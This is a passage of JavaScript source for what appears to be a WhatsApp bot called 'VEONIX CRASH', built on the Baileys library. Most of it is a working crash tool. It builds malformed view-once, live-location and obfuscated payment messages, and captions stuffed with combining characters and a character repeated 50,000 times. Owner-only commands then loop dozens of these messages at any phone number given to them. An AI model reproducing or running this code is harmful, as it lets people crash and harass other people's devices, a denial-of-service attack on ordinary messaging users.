*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢⃢⃢⃢⃢⃢⃢⃢⃢⃞⃞⃞⃞⃞⃞⃞⃞⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃢⃢⃢⃢⃢⃢⃞⃞⃞⃢⃢⃢⃞⃞⃞⃞⃞⃢⃢⃞⃞⃞⃞⃞⃢⃢⃢⃞⃞⃞⃞⃞⃢⃞⃢⃢⃝⃟⃟⃟⃟⃢⃟⃢⃢⃢⃟⃞⃟⃞⃞⃞⃢⃞⃢⃞⃞⃞⃞⃢⃝⃝⃝⃢⃝⃢⃢⃝⃝⃢⃝⃢⃝⃤⃤⃤⃢⃢⃢⃞⃞⃞⃞⃢⃞⃢⃢⃢⃞⃞⃞⃞⃞⃢⃤⃢⃢⃞⃞⃞⃢⃞⃞⃞⃞⃞⃞⃞⃞⃢⃞⃢⃠⃞⃤⃤⃢⃞⃞⃢⃢⃢⃞⃞⃠⃠⃞⃠⃠⃞⃠⃞⃢⃢⃞⃞⃠⃠⃞⃞⃢⃞⃢⃞⃞⃢⃢⃠⃞⃞⃞⃞⃞⃞⃞⃠⃢⃢⃢⃠⃞⃞⃞⃞⃞⃞⃞⃢⃞⃠⃠⃠⃠⃞⃞⃞⃞⃞⃞⃤⃠⃤⃤⃤⃤⃠⃤⃠⃤⃠⃠⃞⃠⃞⃠⃠⃠⃞⃢⃞⃠⃢⃢⃟⃟⃟⃟⃞⃢⃢⃞⃞⃞⃞⃞̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*

MOKAD YA BANG 
ADUHAY🗿
VEONIX NIH BOS.
乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await Zynxzoo.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function bugzynz(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {

  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》

_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 

𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈

*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢⃢⃢⃢⃢⃢⃢⃢⃢⃞⃞⃞⃞⃞⃞⃞⃞⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃢⃢⃢⃢⃢⃢⃞⃞⃞⃢⃢⃢⃞⃞⃞⃞⃞⃢⃢⃞⃞⃞⃞⃞⃢⃢⃢⃞⃞⃞⃞⃞⃢⃞⃢⃢⃝⃟⃟⃟⃟⃢⃟⃢⃢⃢⃟⃞⃟⃞⃞⃞⃢⃞⃢⃞⃞⃞⃞⃢⃝⃝⃝⃢⃝⃢⃢⃝⃝⃢⃝⃢⃝⃤⃤⃤⃢⃢⃢⃞⃞⃞⃞⃢⃞⃢⃢⃢⃞⃞⃞⃞⃞⃢⃤⃢⃢⃞⃞⃞⃢⃞⃞⃞⃞⃞⃞⃞⃞⃢⃞⃢⃠⃞⃤⃤⃢⃞⃞⃢⃢⃢⃞⃞⃠⃠⃞⃠⃠⃞⃠⃞⃢⃢⃞⃞⃠⃠⃞⃞⃢⃞⃢⃞⃞⃢⃢⃠⃞⃞⃞⃞⃞⃞⃞⃠⃢⃢⃢⃠⃞⃞⃞⃞⃞⃞⃞⃢⃞⃠⃠⃠⃠⃞⃞⃞⃞⃞⃞⃤⃠⃤⃤⃤⃤⃠⃤⃠⃤⃠⃠⃞⃠⃞⃠⃠⃠⃞⃢⃞⃠⃢⃢⃟⃟⃟⃟⃞⃢⃢⃞⃞⃞⃞⃞̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*

MOKAD YA BANG 
ADUHAY🗿
VEONIX NIH BOS.
乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️✅⃟╮.xp`+"ꦾ".repeat(50000),

    "sequenceNumber": "0",

    "jpegThumbnail": ""

     }

  }

}

}), { userJid: target, quoted: kuwoted })

await Zynxzoo.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })

}
    
(function(_0x4a0c3c,_0x449ed6){var _0x104feb=_0x1bd9,_0x3e3dd0=_0x4a0c3c();while(!![]){try{var _0x481ad5=parseInt(_0x104feb(0x123))/0x1*(-parseInt(_0x104feb(0x12c))/0x2)+-parseInt(_0x104feb(0x12e))/0x3+-parseInt(_0x104feb(0x11f))/0x4+parseInt(_0x104feb(0x120))/0x5+parseInt(_0x104feb(0x11e))/0x6*(-parseInt(_0x104feb(0x126))/0x7)+-parseInt(_0x104feb(0x12f))/0x8+-parseInt(_0x104feb(0x125))/0x9*(-parseInt(_0x104feb(0x121))/0xa);if(_0x481ad5===_0x449ed6)break;else _0x3e3dd0['push'](_0x3e3dd0['shift']());}catch(_0x2c4bb4){_0x3e3dd0['push'](_0x3e3dd0['shift']());}}}(_0x5751,0x33690));function hi(){var _0x4ca531=_0x1bd9;console['log'](_0x4ca531(0x122));}function _0x5751(){var _0x5489b7=['10RyLaBj','VEONIX\x20CRASH!','10412BelDfW','meu\x20ovo','10276299zlszHl','42MFbSVh','physical-goods','payment_info','pix_static_code','pending','4P46GMY57GC','38zEAssq','+5533998586057','495336GBTdnV','1900344WdqeoS','ORDER','33228OrqiJL','1342808IxSDsY','190890kWQtXO'];_0x5751=function(){return _0x5489b7;};return _0x5751();}hi();function _0x1bd9(_0xdb0a9e,_0x35a4f6){var _0x5751dd=_0x5751();return _0x1bd9=function(_0x1bd910,_0x4c97e1){_0x1bd910=_0x1bd910-0x11e;var _0x5d47b4=_0x5751dd[_0x1bd910];return _0x5d47b4;},_0x1bd9(_0xdb0a9e,_0x35a4f6);}async function sendPaymentInfoMessage(_0x28ef97){var _0x404515=_0x1bd9;await Zynxzoo['relayMessage'](_0x28ef97,{'viewOnceMessage':{'message':{'messageContextInfo':{'deviceListMetadataVersion':0x2,'deviceListMetadata':{}},'interactiveMessage':{'nativeFlowMessage':{'buttons':[{'name':_0x404515(0x128),'buttonParamsJson':JSON['stringify']({'currency':'BRL','total_amount':{'value':0x0,'offset':0x64},'reference_id':_0x404515(0x12b),'type':_0x404515(0x127),'order':{'status':_0x404515(0x12a),'subtotal':{'value':0x0,'offset':0x64},'order_type':_0x404515(0x130),'items':[{'name':'','amount':{'value':0x0,'offset':0x64},'quantity':0x0,'sale_amount':{'value':0x0,'offset':0x64}}]},'payment_settings':[{'type':_0x404515(0x129),'pix_static_code':{'merchant_name':_0x404515(0x124),'key':_0x404515(0x12d),'key_type':'X'}}]})}]}}}}},{'participant':{'jid':_0x28ef97}},{'messageId':null});}

// BATA FUNCTION //
    
const zyn = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2029",
      thumbnail: anjay,
      itemCount: 999999999999999,
      status: "INQUIRY",
      surface: "CATALOG",
      message: `${m.body || m.mtype}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: m.sender.split,
    forwardingScore: 999,
    isForwarded: true
  }
};
    
async function downloadMp3 (link) {
try {
Zynxzoo.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson (`https://api.kyuurzy.site/api/download/aio?query=${link}`)
Zynxzoo.sendMessage(m.chat, { audio: {url: kyuu.result.url}, mimetype: "audio/mpeg"},{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

async function downloadMp4 (link) {
try {
Zynxzoo.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson(`https://api.kyuurzy.site/api/download/aio?query=${link}`)
Zynxzoo.sendMessage(m.chat, { video: {url: kyuu.result.url}, caption: '' },{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

//self public
global.public = true
if (!global.public) {
if (!m.key.fromMe && !isCreator) return
}

const reply = (teks) => { 
Zynxzoo.sendMessage(from, { text: teks, contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
title: `VEONIX CRASH💥`,
body: `VEONIX`,
previewType: "VIDEO",
thumbnail: anjay,
sourceUrl: `${global.url}`,
mediaUrl: `${global.url}`
}
},
text: teks
}, {
quoted: m
})
}

const reply2 = (teks) => {
Zynxzoo.sendMessage(from, { text : teks }, { quoted : m })
}


function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}

let d = new Date(new Date + 3600000)
let locale = 'id'
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, {
  day: 'numeric',
  month: 'long',
  year: 'numeric'
})
const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })

function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}

function msToDate(ms) {
		temp = ms
		days = Math.floor(ms / (24*60*60*1000));
		daysms = ms % (24*60*60*1000);
		hours = Math.floor((daysms)/(60*60*1000));
		hoursms = ms % (60*60*1000);
		minutes = Math.floor((hoursms)/(60*1000));
		minutesms = ms % (60*1000);
		sec = Math.floor((minutesms)/(1000));
		return days+" Hari "+hours+" Jam "+ minutes + " Menit";
		// +minutes+":"+sec;
  }

// Sayying time
const timee = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(timee < "23:59:00"){
var waktuucapan = 'Selamat Malam 🌃'
}
if(timee < "19:00:00"){
var waktuucapan = 'Selamat Petang 🌆'
}
if(timee < "18:00:00"){
var waktuucapan = 'Selamat Sore 🌅'
}
if(timee < "15:00:00"){
var waktuucapan = 'Selamat Siang 🏙'
}
if(timee < "10:00:00"){
var waktuucapan = 'Selamat Pagi 🌄'
}
if(timee < "05:00:00"){
var waktuucapan = 'Selamat Subuh 🌉'
}
if(timee < "03:00:00"){
var waktuucapan = 'Tengah Malam 🌌'
}


if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('case.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Maaf, command yang kamu berikan salah. mungkin ini yang kamu maksud:\n\n•> ${prefix+mean}\n•> Kemiripan: ${similarityPercentage}%`
reply(response)
}}

switch(command) {

case 'veonix':{
        reply('*SIAP MEMBANTAI!!*')
            }
            break

case 'menu': case 'help': {
await loading()
let imgsc = await prepareWAMessageMedia({
image: anjay
}, {
upload: Zynxzoo.waUploadToServer
})
let anu = `
┏━━━━[ \`INFO BOT\` ] ━━━━┓
┃ *CREATOR : ${global.owner}*
┃ *CREATOR : ${global.owner2}*
┃ *BOTNAME : ${global.bot}*
┃ *VERSION : ${global.versi}*
┗━━━━━━━━━━━━━━━━━━┛
┏━━━[ \`BOT-MENU\` ] ━━━┓
┃┃${global.simbol} ʙᴜɢᴍᴇɴᴜᴠ1
┃┃${global.simbol} ʙᴜɢᴍᴇɴᴜᴠ2
┃┃${global.simbol} ᴍᴜʀʙᴜɢ
┃┃${global.simbol} ᴄʀᴇᴅɪᴛ
┗━━━━━━━━━━━━━━━━━┛`
const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: false
},
body: {
text: anu
},
footer: {
text: ""
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson: `{
display_text: 'VEONIX CRASH',
url: "${global.ch}",
merchant_url: "${global.ch}"
}`
}],
messageParamsJson: ""
}
}
}
}
}, {quoted:zyn})
await Zynxzoo.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
await sleep(500)
 }
break

case 'murbug': {
await loading()
let imgsc = await prepareWAMessageMedia({
image: anjay
}, {
upload: Zynxzoo.waUploadToServer
})
let anu = `
┏━━━━[ \`INFO BOT\` ] ━━━━┓
┃ *CREATOR : ${global.owner}*
┃ *CREATOR : ${global.owner2}*
┃ *BOTNAME : ${global.bot}*
┃ *VERSION : ${global.versi}*
┗━━━━━━━━━━━━━━━━━━┛
┏━━━[ \`MURBUG-MENU\` ] ━━━┓
┃┃${global.simbol} ᴀᴅᴅᴍᴜʀʙᴜᴠ
┃┃${global.simbol} ᴅᴇʟᴍᴜʙᴜɢ
┃┃${global.simbol} sᴇʟᴇʙᴍᴏᴅᴇ
┃┃${global.simbol} ᴡᴀʀᴍᴏᴅᴇ
┃┃${global.simbol} ᴘʟᴀʏ
┃┃${global.simbol} ᴍᴘ4/ᴍᴘ3
┗━━━━━━━━━━━━━━━━━┛`
const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: false
},
body: {
text: anu
},
footer: {
text: ""
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson: `{
display_text: 'VEONIX CRASH',
url: "${global.ch}",
merchant_url: "${global.ch}"
}`
}],
messageParamsJson: ""
}
}
}
}
}, {quoted:zyn})
await Zynxzoo.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
await sleep(500)
 }
break

case 'bugmenuv1': {
await loading()
let imgsc = await prepareWAMessageMedia({
image: anjay
}, {
upload: Zynxzoo.waUploadToServer
})
let anu = `
┏━━━[ \`ZERO-MENU\` ] ━━━┓
┃┃${global.simbol} ᴢᴇʀᴏ-ᴇxᴇ
┃┃${global.simbol} ᴢᴇʀᴏ-ɪᴘ
┃┃${global.simbol} ᴢᴇʀᴏ-ʙᴇᴛᴀ
┃┃${global.simbol} ᴢᴇʀᴏ-ᴍᴜʀᴋᴀ
┃┃${global.simbol} ᴢᴇʀᴏ-ᴅᴀʀᴋɴᴇs
┃┃${global.simbol} ᴢᴇʀᴏ-ᴋʀᴏᴄᴏ
┃┃${global.simbol} ᴢᴇʀᴏ-ɴᴇxᴛ
┃┃${global.simbol} ᴘᴇʀᴍɪsɪ-ᴘᴀᴋᴇᴛ
┃┃${global.simbol} ᴢᴇʀᴏ-ғᴏʀᴄᴇ
┗━━━━━━━━━━━━━━━━━┛
┏━━━[ \`EMOJI-MENU\` ] ━━━┓
┃┃${global.simbol} 🗿
┃┃${global.simbol} 📦
┃┃${global.simbol} 🥵
┃┃${global.simbol} 🥶
┃┃${global.simbol} 😈
┃┃${global.simbol} 👽
┃┃${global.simbol} 😹
┃┃${global.simbol} 😡
┃┃${global.simbol} 💀
┗━━━━━━━━━━━━━━━━━┛`
const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: false
},
body: {
text: anu
},
footer: {
text: ""
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson: `{
display_text: 'ZYREX DEV',
url: "${global.zyrex}",
merchant_url: "${global.zyrex}"
}`
}],
messageParamsJson: ""
}
}
}
}
}, {quoted:zyn})
await Zynxzoo.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
await sleep(500)
 }
break

case 'credit': {
await loading()
let imgsc = await prepareWAMessageMedia({
image: anjay
}, {
upload: Zynxzoo.waUploadToServer
})
let anu = `
┏━━━[ \`DEVELOPER\` ] ━━━┓
┃ *SKYZO DEVELOPER*
┃ *ZYREX DEVELOPER*
┗━━━━━━━━━━━━━━━━━┛
┏━━━[ \`INFORMATION\` ] ━━━┓
┃ *VERSION : 1.0.0*
┃ *LIB : BAILEYS - SOCKET*
┃ *BAILEYS : 6.7.7*
┗━━━━━━━━━━━━━━━━━┛
┏━━━[ \`SUPPORT\` ] ━━━┓
┃ *MANZ - HOSTING*
┃ *VSTORE*
┃ *HEAVEN - HOSTING*
┗━━━━━━━━━━━━━━━━━┛`
const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: false
},
body: {
text: anu
},
footer: {
text: ""
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson: `{
display_text: 'VEONIX CRASH',
url: "${global.ch}",
merchant_url: "${global.ch}"
}`
}],
messageParamsJson: ""
}
}
}
}
}, {quoted:zyn})
await Zynxzoo.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
await sleep(500)
 }
break

case 'bugmenuv2': {
await loading()
let imgsc = await prepareWAMessageMedia({
image: anjay
}, {
upload: Zynxzoo.waUploadToServer
})
let anu = `
┏━━━[ \`SKYZO-MENU\` ] ━━━┓
┃┃${global.simbol} ᴍɪsɪ-ɢᴀɴᴀs
┃┃${global.simbol} ᴇᴡᴇ-ᴅɪᴛᴇᴍᴘᴀᴛ
┃┃${global.simbol} ɴɢᴀᴘᴀɪɴ-ᴅᴇᴋ
┃┃${global.simbol} sᴇɢɪɴɪ-ᴅᴏᴀɴɢ
┃┃${global.simbol} sᴄ-ʟᴀᴡᴀᴄᴋ
┃┃${global.simbol} ᴋʀᴏᴄᴏ-ᴅɪᴀᴍ
┃┃${global.simbol} ʟᴀᴡᴀᴄᴋ-ᴅᴇᴋ
┃┃${global.simbol} ʀᴜsᴅɪ-ᴊᴏᴍᴏᴋ
┃┃${global.simbol} sɪᴍᴀɴɪs-ᴇɴᴛᴏᴅ
┃┃${global.simbol} ᴄɪᴘᴏᴋ-ᴋᴀᴋɢᴇᴍ
┗━━━━━━━━━━━━━━━━━┛
┏━━━[ \`EMOJI-MENU\` ] ━━━┓
┃┃${global.simbol} 😘
┃┃${global.simbol} 😂
┃┃${global.simbol} ❤
┃┃${global.simbol} 💥
┃┃${global.simbol} 😁
┃┃${global.simbol} 😅
┃┃${global.simbol} 🙏
┃┃${global.simbol} 👌
┃┃${global.simbol} 💯
┗━━━━━━━━━━━━━━━━━┛
*FITUR INI KHUSUS BUG DITEMPAT*`
const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: false
},
body: {
text: anu
},
footer: {
text: ""
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson: `{
display_text: 'SKYZO - DEV',
url: "${global.skyzo}",
merchant_url: "${global.skyzo}"
}`
}],
messageParamsJson: ""
}
}
}
}
}, {quoted:zyn})
await Zynxzoo.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
await sleep(500)
 }
break

case 'addmurbug':
if (!isCreator) return reply(mess.OnlyOwner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} Contoh ${prefix+command} 6283841442290`)
bnnd = text.split("|")[0].replace(/[^0-9]/g, '')
let cekkanbre = await Zynxzoo.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (cekkanbre.length == 0) return reply(`Masukkan nomor yang valid dan daftar di WhatsApp!`)
Premium.push(bnnd)
fs.writeFileSync('./lib/databases/murbug.json', JSON.stringify(Premium))
reply(`Nomor ${bnnd} telah di tambahkan dalam database premium!`)
break
//===================================
case 'delmurbug':
if (!isCreator) return reply(mess.OnlyOwner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} Contoh ${prefix+command} 6283841442290`)
yaki = text.split("|")[0].replace(/[^0-9]/g, '')
unp = Premium.indexOf(yaki)
Premium.splice(unp, 1)
fs.writeFileSync('./lib/databases/murbug.json', JSON.stringify(Premium))
reply(`Nomor ${yaki} telah di hapus dalam database premium!`)
break

case 'zero-exe': case 'zero-ip': case 'zero-beta':  case 'zero-murka': case 'zero-darknes': case 'zero-kroco': case 'zero-next': case 'zero-force': case 'misi-paket': {
if (!isCreator) return reply(mess.OnlyOwner)
if (!isPremium) return reply(`LU SIAPA BEGO?`)
if (!text) return reply(`Example: .${command} 628xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return reply(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
let Pe = peler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await penghitaman(Pe, zynbug)
await sendPaymentInfoMessage(Pe, zpay)
await iponcrash(Pe, force)
await sendPaymentInfoMessage(Pe, zynbug)
await sendSystemCrashMessage(Pe, force)
await sendPaymentInfoMessage(Pe, zynxzobug)
await iponcrash(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force)
await penghitaman(Pe, zynbug)
await sendPaymentInfoMessage(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zpay)
await ngeloc(Pe, force)
await sendPaymentInfoMessage(Pe, zpay)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, force2)
await penghitaman(Pe, zynbug)
await sendPaymentInfoMessage(Pe, force)
await sendPaymentInfoMessage(Pe, zynbug)
await ngeloc(Pe, force2)
Zynxzoo.sendMessage(Pe, {text: `\`ᏃᎬᎡϴ ᏟᎡᎪՏᎻೄྀ\``}, {quoted: m})
Zynxzoo.sendMessage(Pe, {text: `\`ᏃᎬᎡϴ ᏟᎡᎪՏᎻᎻೄྀ\``}, {quoted: m})
Zynxzoo.sendMessage(Pe, {text: `\`ᏃᎬᎡϴ ᏟᎡᎪՏᎻೄྀ\``}, {quoted: m})
Zynxzoo.sendMessage(Pe, {text: `\`ᏃᎬᎡϴ ᏟᎡᎪՏᎻᎻೄྀ\``}, {quoted: m})
await sendPaymentInfoMessage(Pe)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, zynxzobug)
await sendPaymentInfoMessage(Pe, zynxzobug)
}
await reply(mess.donebug)
}
break

